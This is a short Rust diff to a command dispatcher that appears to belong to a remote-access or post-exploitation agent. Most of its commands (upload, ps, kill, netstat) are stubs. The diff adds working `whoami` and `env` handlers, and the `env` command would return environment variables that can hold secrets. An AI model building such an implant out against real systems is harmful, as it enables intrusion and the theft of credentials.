@@ -128,8 +128,9 @@ unsafe fn dispatch(cmd: &str, args: &[String]) -> Result<String, String> {
         "upload"                => todo!(),
         "ps"                    => todo!(),
         "kill"                  => todo!(),
-        "whoami"                => todo!(),
+        "whoami"                => sysinfo::cmd_whoami(),
         "sysinfo"               => sysinfo::cmd_sysinfo(),
+        "env"                   => sysinfo::cmd_env(),
         "netstat"               => todo!(),
         "ifconfig" | "ipconfig" => todo!(),
         //...
